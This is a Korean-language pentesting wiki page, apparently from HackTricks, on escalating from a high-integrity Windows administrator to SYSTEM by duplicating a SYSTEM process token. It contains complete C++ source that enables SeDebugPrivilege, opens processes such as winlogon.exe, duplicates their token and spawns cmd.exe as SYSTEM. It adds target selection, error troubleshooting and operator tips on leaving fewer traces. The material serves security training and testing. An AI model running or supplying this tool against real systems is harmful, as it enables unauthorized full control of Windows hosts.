# SeImpersonate from High To System

{{#include ../../banners/hacktricks-training.md}}

이 페이지에서는 **High Integrity administrator process**에서 **보호되지 않은 SYSTEM process를 열고, 해당 token을 duplicate한 다음, 그 token으로 child process를 생성**하여 **`NT AUTHORITY\SYSTEM`**으로 전환하는 **manual** 방법을 설명합니다.

**`SeImpersonatePrivilege`** / **`SeAssignPrimaryTokenPrivilege`**만 있고 **적합한 SYSTEM process를 열 수 없는 경우**, 일반적으로 **Potato / named-pipe** 경로가 더 안정적입니다:

{{#ref}}
named-pipe-client-impersonation.md
{{#endref}}

{{#ref}}
roguepotato-and-printspoofer.md
{{#endref}}

원하는 것이 단순히 `SYSTEM`이 아니라 가능한 한 많은 privilege를 가진 **SYSTEM token**이라면 다음 항목도 확인하세요:

{{#ref}}
sedebug-+-seimpersonate-copy-token.md
{{#endref}}

## 빠른 triage

token을 탈취하기 전에 먼저 context를 빠르게 검증합니다:
```cmd
whoami /groups | findstr /i "high mandatory"
whoami /priv | findstr /i "SeDebugPrivilege SeImpersonatePrivilege SeAssignPrimaryTokenPrivilege"
```
실용적인 참고 사항:

- **High Integrity** admin token이면 보통 **`SeDebugPrivilege`를 활성화**하고 보호되지 않은 여러 SYSTEM 프로세스를 열기에 충분합니다.
- **`CreateProcessWithTokenW`는 호출자에게 `SeImpersonatePrivilege`가 필요합니다.** 이 API가 `1314`로 실패하면 SYSTEM primary token을 이미 duplicate한 후 `CreateProcessAsUserW`로 전환하세요.
- 최신 Windows에서는 **LSA protection / PPL**이 `SeDebugPrivilege`를 가진 관리자도 접근을 차단하므로 **`lsass.exe`는 종종 좋지 않은 target**입니다. 대신 SYSTEM으로 실행 중인 **`winlogon.exe`**, **`wininit.exe`**, **`services.exe`** 또는 초기 **`svchost.exe`**를 선호하세요.
- 모든 SYSTEM 프로세스가 똑같이 유용한 token을 가지는 것은 아닙니다. SYSTEM을 얻었지만 일부 privilege가 없으면 technique이 고장 났다고 가정하지 말고 다른 SYSTEM 프로세스를 시도하세요.

## PID를 신중하게 선택하기

이 technique이 안정적으로 작동하도록 하는 가장 쉬운 방법은 **Administrators가 실제로 프로세스를 query하고 해당 token을 duplicate할 수 있도록 DACL이 설정된 SYSTEM 프로세스를 선택하는 것**입니다.

먼저 테스트하기 좋은 후보:

- `winlogon.exe`
- `wininit.exe`
- `services.exe`
- SYSTEM으로 실행 중인 일부 초기 `svchost.exe` 인스턴스

기본적으로 피할 것:

- **RunAsPPL / LSA protection**이 활성화된 host의 `lsass.exe`
- `SeDebugPrivilege`를 활성화한 후에도 `Access denied`를 반환하는 protected / security-sensitive 프로세스

Elevated 상태로 실행한 **Process Explorer** 또는 **Process Hacker**를 사용하여 후보 프로세스와 해당 token/ACL을 검사할 수 있습니다.

### Code

다음 code는 [여기](https://medium.com/@seemant.bisht24/understanding-and-abusing-access-tokens-part-ii-b9069f432962)에 있으며, **Process ID를 argument로 지정**할 수 있게 하고 지정한 프로세스의 **user로 실행되는** CMD를 실행합니다.\
High Integrity 프로세스에서 실행하면 **System으로 실행 중인 프로세스의 PID**(`winlogon`, `wininit` 등)를 **지정**하고 SYSTEM으로 `cmd.exe`를 실행할 수 있습니다.<sup>[[3]](#references)</sup>
```cpp
impersonateuser.exe 1234
```

```cpp:impersonateuser.cpp
// From https://securitytimes.medium.com/understanding-and-abusing-access-tokens-part-ii-b9069f432962

#include <windows.h>
#include <iostream>
#include <Lmcons.h>
BOOL SetPrivilege(
HANDLE hToken,          // access token handle
LPCTSTR lpszPrivilege,  // name of privilege to enable/disable
BOOL bEnablePrivilege   // to enable or disable privilege
)
{
TOKEN_PRIVILEGES tp;
LUID luid;
if (!LookupPrivilegeValue(
NULL,            // lookup privilege on local system
lpszPrivilege,   // privilege to lookup
&luid))        // receives LUID of privilege
{
printf("[-] LookupPrivilegeValue error: %u\n", GetLastError());
return FALSE;
}
tp.PrivilegeCount = 1;
tp.Privileges[0].Luid = luid;
if (bEnablePrivilege)
tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
else
tp.Privileges[0].Attributes = 0;
// Enable the privilege or disable all privileges.
if (!AdjustTokenPrivileges(
hToken,
FALSE,
&tp,
sizeof(TOKEN_PRIVILEGES),
(PTOKEN_PRIVILEGES)NULL,
(PDWORD)NULL))
{
printf("[-] AdjustTokenPrivileges error: %u\n", GetLastError());
return FALSE;
}
if (GetLastError() == ERROR_NOT_ALL_ASSIGNED)
{
printf("[-] The token does not have the specified privilege. \n");
return FALSE;
}
return TRUE;
}
std::string get_username()
{
TCHAR username[UNLEN + 1];
DWORD username_len = UNLEN + 1;
GetUserName(username, &username_len);
std::wstring username_w(username);
std::string username_s(username_w.begin(), username_w.end());
return username_s;
}
int main(int argc, char** argv) {
// Print whoami to compare to thread later
printf("[+] Current user is: %s\n", (get_username()).c_str());
// Grab PID from command line argument
char* pid_c = argv[1];
DWORD PID_TO_IMPERSONATE = atoi(pid_c);
// Initialize variables and structures
HANDLE tokenHandle = NULL;
HANDLE duplicateTokenHandle = NULL;
STARTUPINFO startupInfo;
PROCESS_INFORMATION processInformation;
ZeroMemory(&startupInfo, sizeof(STARTUPINFO));
ZeroMemory(&processInformation, sizeof(PROCESS_INFORMATION));
startupInfo.cb = sizeof(STARTUPINFO);
// Add SE debug privilege
HANDLE currentTokenHandle = NULL;
BOOL getCurrentToken = OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &currentTokenHandle);
if (SetPrivilege(currentTokenHandle, L"SeDebugPrivilege", TRUE))
{
printf("[+] SeDebugPrivilege enabled!\n");
}
// Call OpenProcess(), print return code and error code
HANDLE processHandle = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, true, PID_TO_IMPERSONATE);
if (GetLastError() == NULL)
printf("[+] OpenProcess() success!\n");
else
{
printf("[-] OpenProcess() Return Code: %i\n", processHandle);
printf("[-] OpenProcess() Error: %i\n", GetLastError());
}
// Call OpenProcessToken(), print return code and error code
BOOL getToken = OpenProcessToken(processHandle, MAXIMUM_ALLOWED, &tokenHandle);
if (GetLastError() == NULL)
printf("[+] OpenProcessToken() success!\n");
else
{
printf("[-] OpenProcessToken() Return Code: %i\n", getToken);
printf("[-] OpenProcessToken() Error: %i\n", GetLastError());
}
// Impersonate user in a thread
BOOL impersonateUser = ImpersonateLoggedOnUser(tokenHandle);
if (GetLastError() == NULL)
{
printf("[+] ImpersonatedLoggedOnUser() success!\n");
printf("[+] Current user is: %s\n", (get_username()).c_str());
printf("[+] Reverting thread to original user context\n");
RevertToSelf();
}
else
{
printf("[-] ImpersonatedLoggedOnUser() Return Code: %i\n", getToken);
printf("[-] ImpersonatedLoggedOnUser() Error: %i\n", GetLastError());
}
// Call DuplicateTokenEx(), print return code and error code
BOOL duplicateToken = DuplicateTokenEx(tokenHandle, MAXIMUM_ALLOWED, NULL, SecurityImpersonation, TokenPrimary, &duplicateTokenHandle);
if (GetLastError() == NULL)
printf("[+] DuplicateTokenEx() success!\n");
else
{
printf("[-] DuplicateTokenEx() Return Code: %i\n", duplicateToken);
printf("[-] DupicateTokenEx() Error: %i\n", GetLastError());
}
// Call CreateProcessWithTokenW(), print return code and error code
BOOL createProcess = CreateProcessWithTokenW(duplicateTokenHandle, LOGON_WITH_PROFILE, L"C:\\Windows\\System32\\cmd.exe", NULL, 0, NULL, NULL, &startupInfo, &processInformation);
if (GetLastError() == NULL)
printf("[+] Process spawned!\n");
else
{
printf("[-] CreateProcessWithTokenW Return Code: %i\n", createProcess);
printf("[-] CreateProcessWithTokenW Error: %i\n", GetLastError());
}
return 0;
}
```
## 유용한 API / access-right 참고 사항

이 sample에서는 `MAXIMUM_ALLOWED`를 사용하지만, 실제 작업에서는 관련된 최소 구성 요소를 기억해 두는 것이 유용합니다.

- `OpenProcessToken()`에는 **`PROCESS_QUERY_LIMITED_INFORMATION`** 권한으로 process handle을 연 것만 필요합니다.
- `CreateProcessWithTokenW()`를 사용하려면 **primary token handle**에 **`TOKEN_QUERY | TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY`** 권한이 있어야 합니다.<sup>[[1]](#references)</sup>
- `DuplicateTokenEx()`는 impersonation token만이 아니라 **primary token**(`TokenPrimary`)을 생성해야 합니다.
- 이미 SYSTEM으로 impersonation했는데도 `CreateProcessWithTokenW()`가 `1314` 오류와 함께 계속 실패하면 대신 `CreateProcessAsUserW()`를 시도해 보세요.

즉, token을 query하는 데 필요한 권한만 요청하는 것보다 target process를 **`PROCESS_ALL_ACCESS`**로 여는 것은 일반적으로 불필요하며 더 많은 흔적을 남깁니다.

## 오류

경우에 따라 System으로 impersonate하려고 시도했지만 작동하지 않고 다음과 같은 output이 표시될 수 있습니다.
```cpp
[+] OpenProcess() success!
[+] OpenProcessToken() success!
[-] ImpersonatedLoggedOnUser() Return Code: 1
[-] ImpersonatedLoggedOnUser() Error: 5
[-] DuplicateTokenEx() Return Code: 0
[-] DupicateTokenEx() Error: 5
[-] CreateProcessWithTokenW Return Code: 0
[-] CreateProcessWithTokenW Error: 1326
```
이는 High Integrity level에서 실행 중이더라도 해당 프로세스/token에 대해 **충분한 권한이 없다는 의미**입니다.\
**Process Explorer**를 사용하여 `svchost.exe` 프로세스에 대한 현재 Administrator 권한을 확인해 보겠습니다(또는 **Process Hacker**를 사용할 수도 있습니다).

1. `svchost.exe` 프로세스를 선택합니다.
2. Right Click --> Properties
3. "Security" Tab에서 오른쪽 하단의 "Permissions" 버튼을 클릭합니다.
4. "Advanced"를 클릭합니다.
5. "Administrators"를 선택하고 "Edit"를 클릭합니다.
6. "Show advanced permissions"를 클릭합니다.

![Code - Error: 6. "Show advanced permissions"를 클릭합니다](<../../images/image (437).png>)

이전 이미지에는 선택한 프로세스에 대해 "Administrators"가 보유한 모든 권한이 표시되어 있습니다(`svchost.exe`의 경우 볼 수 있듯이 "Query" 권한만 보유합니다).

`winlogon.exe`에 대해 "Administrators"가 보유한 권한을 확인해 보겠습니다.

![Code - Error: "Administrators"가 winlogon.exe에 대해 보유한 권한 확인](<../../images/image (1102).png>)

해당 프로세스에서 "Administrators"는 "Read Memory" 및 "Read Permissions"를 수행할 수 있으며, 이는 아마도 Administrators가 이 프로세스에서 사용하는 token을 impersonate할 수 있도록 해줍니다.

### 일반적인 실패 원인

- **`OpenProcess()` / `OpenProcessToken()` -> `5 (Access denied)`**: 프로세스 DACL이 접근을 차단하거나 대상이 **protected/PPL** 상태입니다. 다른 SYSTEM 프로세스를 선택하세요.
- **`DuplicateTokenEx()` -> `5 (Access denied)`**: token handle을 충분한 권한 없이 열었거나 대상 token의 DACL이 duplication을 차단합니다.
- **`CreateProcessWithTokenW()` -> `1314`**: caller에게 현재 **`SeImpersonatePrivilege`**가 활성화되어 있지 않습니다. 먼저 이를 활성화하거나, duplicated primary token을 사용하여 `CreateProcessAsUserW()`를 사용해 보세요.
- 이전 실패 후 **`CreateProcessWithTokenW()` -> `1326`**: 이는 대개 앞선 token duplication/impersonation 단계가 실패하여 child process를 실행할 usable primary token이 없다는 의미입니다.

## Operator notes

- 이 technique은 이미 **local admin + high integrity** 상태이며 service나 named-pipe coercion chain을 시작하지 않고 SYSTEM으로 빠르게 전환할 수 있는 수동 경로를 원할 때 매우 유용합니다.
- 강화된 Windows 11 / Server 환경에서는 **LSA protection이 점점 더 일반적**이므로 `lsass.exe`를 항상 읽을 수 있다고 가정하는 workflow는 취약합니다. **`winlogon.exe` / `wininit.exe` / `services.exe`를 먼저 선택하는 것이 일반적으로 더 좋습니다**.<sup>[[2]](#references)</sup>
- 권한이 상승된 admin desktop이 아닌 **service account** context를 획득한 경우에는 이 페이지의 방법보다 **Potato family**가 일반적으로 더 적합합니다.



## References

- [1] [Microsoft: CreateProcessWithTokenW](https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-createprocesswithtokenw)
- [2] [SensePost: Abusing Windows' tokens to compromise Active Directory without touching LSASS](https://sensepost.com/blog/2022/abusing-windows-tokens-to-compromise-active-directory-without-touching-lsass/)
- [3] [Understanding and Abusing Process Tokens — Part II](https://medium.com/@seemant.bisht24/understanding-and-abusing-access-tokens-part-ii-b9069f432962)

{{#include ../../banners/hacktricks-training.md}}
